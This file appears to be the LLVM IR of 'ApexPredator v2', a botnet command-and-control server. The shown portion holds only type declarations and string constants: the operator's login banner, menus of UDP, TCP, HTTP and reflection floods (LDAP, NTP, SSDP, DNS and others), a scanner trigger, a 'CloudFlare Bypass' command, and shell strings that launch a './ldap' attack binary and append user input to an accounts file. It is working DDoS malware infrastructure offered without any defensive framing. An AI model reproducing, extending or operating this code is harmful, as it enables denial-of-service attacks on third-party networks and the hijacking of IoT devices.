; ModuleID = 'host/ir_bcf/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.17 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
